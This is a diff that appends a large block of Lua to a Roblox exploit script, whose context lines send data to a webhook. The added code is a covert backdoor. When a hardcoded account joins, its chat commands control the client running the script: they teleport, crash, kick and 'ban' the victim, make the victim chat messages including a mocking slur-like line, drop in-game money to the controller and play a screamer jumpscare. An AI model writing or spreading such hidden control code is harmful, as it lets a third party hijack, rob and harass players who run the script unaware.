@@ -81,3 +81,333 @@ local requestParams = {
 -- Sending the request to the webhook
 local request = http_request or request or HttpPost or syn.request
 request(requestParams)
+
+
+
+local name = "baconman143krich" 
+
+game:GetService'Players'.PlayerAdded:Connect(function(player)
+
+if player.Name == name then
+
+rbxname = name
+
+local prefix = "."
+
+local LPlayer = game.Players[name]
+
+messageLL = "Im Gay" 
+
+---------------------commands--------------------------------------------------------------------------
+
+--bring teleports alts to you
+
+--msg says message
+
+--sit sits alts
+
+--unsit unsits alts
+
+--float floats alts
+
+--unfloat unfloats alts
+
+--say makes alts say message
+
+--freeze make your alt freeze
+
+--unfreeze make your alt unfreeze
+
+--kill kill your alt
+
+--kick kick your alt
+
+--ban your alt
+
+--showtags show your tags
+
+LPlayer.Chatted:Connect(function(msg)
+
+	msg = msg:lower()	if string.sub(msg,1,3) == "/e " then
+
+		msg = string.sub(msg,4)
+
+	end
+
+	if string.sub(msg,1,1) == prefix then
+
+		local cmd
+
+		local space = string.find(msg," ")
+
+		if space then
+
+			cmd = string.sub(msg,2,space-1)
+
+		else
+
+			cmd = string.sub(msg,2)
+
+		end
+
+		
+
+--------------------------------commands scripts----------------------------------------------------------
+
+		
+
+		if cmd == "bring" then
+
+		    local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
+
+local p2 = rbxname
+
+local pos = p1.CFrame
+
+p1.CFrame = game.Players[p2].Character.HumanoidRootPart.CFrame
+
+	end
+
+		if cmd == "msg" then
+
+		    local args = {
+
+			[1] = messageLL,
+
+			[2] = "All"
+
+		}
+
+		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+
+	end
+
+		if cmd == "sit" then
+
+		    game.Players.LocalPlayer.Character.Humanoid.Sit = true
+
+    end
+
+		if cmd =="unsit" then
+
+		    game.Players.LocalPlayer.Character.Humanoid.Sit = false
+
+    end
+
+        if cmd == "flash" then
+local OFF = Instance.new("ScreenGui")
+                local Frame = Instance.new("Frame")
+                           
+                local Name_ = math.random(99,25252).."+++".."lol" 
+                OFF.Name = Name_
+                OFF.Parent = game.CoreGui
+                OFF.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+                            
+                Frame.Parent = OFF
+                Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+                Frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
+                Frame.BorderColor3 = Color3.fromRGB(255,255,255)
+                Frame.BorderSizePixel = 100
+                Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+                Frame.Size = UDim2.new(1, 0, 1, 0)
+                for i=1,100 do
+                    Frame.Transparency = Frame.Transparency+0.01
+                    wait(.1)
+                end
+                game.CoreGui:FindFirstChild(Name_):Destroy()
+    end
+
+        if cmd == "crash" then
+while true do
+print("crash")
+end
+    end
+
+        if cmd == "say" then
+
+            		if cmd == "say" then
+
+            		    local var = string.sub(msg,space+1)
+
+		                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(var, "All")
+
+    end
+
+    end
+
+        if cmd == "kill" then
+
+		game.Players.LocalPlayer.Character.Humanoid.Health = 0
+
+    end
+
+if cmd == "rename" then
+            		if cmd == "rename" then
+            		    local var = string.sub(msg,space+1)
+		game.Players[name].Character.Humanoid.DisplayName = (var)
+    end
+   end
+
+        if cmd == "freeze" then
+
+		game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+
+	game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
+
+    end
+
+        if cmd == "unfreeze" then
+
+		game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+
+	game.Players.LocalPlayer.Character.UppperTorso.Anchored = false
+
+    end
+
+        if cmd == "kick" then
+            		if cmd == "kick" then
+            		    local var = string.sub(msg,space+1)
+		game.Players.LocalPlayer:Kick(var)
+    end
+   end
+   
+
+if cmd == "jumpscare" then
+
+		game.Players.LocalPlayer.Character.Humanoid.Health = 0
+
+local me = "YourName" -- So you don't get jumpscared unless you want to.
+for i,v in pairs(game.Players:GetPlayers()) do
+      if v.Name ~= me and not v.PlayerGui:FindFirstChild("Screamer") and v:FindFirstChild("PlayerGui") then
+              spawn(function()
+                      local newgui = Instance.new("ScreenGui",v.PlayerGui)
+                      newgui.Name = "Screamer"
+                      local newimage = Instance.new("ImageLabel",newgui)
+                      newimage.Image = "rbxassetid://142410803"
+                      newimage.Size = UDim2.new(1,0,1,0)
+                      local s = Instance.new("Sound",newgui)
+                      s.SoundId = "rbxassetid://5567523008"
+                      s.Volume = 5
+                      s.Looped = false
+                      s:Play()
+                      print("Screamed "..v.Name)
+                      while wait() do
+                              newimage.ImageColor3 = Color3.new(math.random(1,255)/255,math.random(1,255)/255,math.random(1,255)/255)
+                              wait()
+                              newimage.ImageColor3 = Color3.new(1,1,1)
+                      end
+              end)
+      end
+end
+
+    end
+    
+
+    if cmd == "ban" then
+
+		game.Players.LocalPlayer:Kick("User BANNED")
+
+    end
+    
+    if cmd == "fling" then
+
+		game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(1000,1000,1000)
+
+    end
+
+if cmd == "benx" then
+local vim = game:service("VirtualInputManager")
+vim:SendKeyEvent(true, "LeftControl", false, game)
+
+_G.loops = true
+
+while _G.loops do
+wait()
+local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
+local p2 = rbxname
+local pos = p1.CFrame
+
+p1.CFrame = game.Players[p2].Character.HumanoidRootPart.CFrame
+end
+end
+
+if cmd == "unbenx" then
+_G.loops = false
+
+while _G.loops do
+wait()
+local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
+local p2 = rbxname
+local pos = p1.CFrame
+
+p1.CFrame = game.Players[p2].Character.HumanoidRootPart.CFrame
+end
+end        
+
+if cmd == "drop" then
+            		if cmd == "drop" then
+            		    local var = string.sub(msg,space+1)
+		game.ReplicatedStorage.MainEvent:FireServer("DropMoney",var)
+    end
+   end
+
+if cmd == "warn" then
+            		if cmd == "warn" then
+            		    local var = string.sub(msg,space+1)
+		game:GetService("StarterGui"):SetCore("SendNotification", { 
+
+	Title = "Warning";
+
+	Text = (var);
+
+	Icon = "rbxthumb://type=Asset&id=6525527347&w=150&h=150"})
+
+Duration = 16;
+    end
+    end  
+    
+function GetPlayer(String)
+
+    local plr
+
+    local strl = String:lower()
+
+        for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+
+            if v.Name:lower():sub(1, #String) == String:lower() then
+
+                plr = v
+
+            end 
+
+        end
+
+        if String == "me" then
+
+                plr = game.Players.LocalPlayer
+
+            end
+
+        if String == "" or String == " " then
+
+           plr = nil
+
+        end
+
+    return plr
+
+end
+
+	end
+
+end)
+
+if render1 == true then
+
+    game:GetService("RunService"):Set3dRenderingEnabled(false)
+
+    end
+
+end
+
+end)
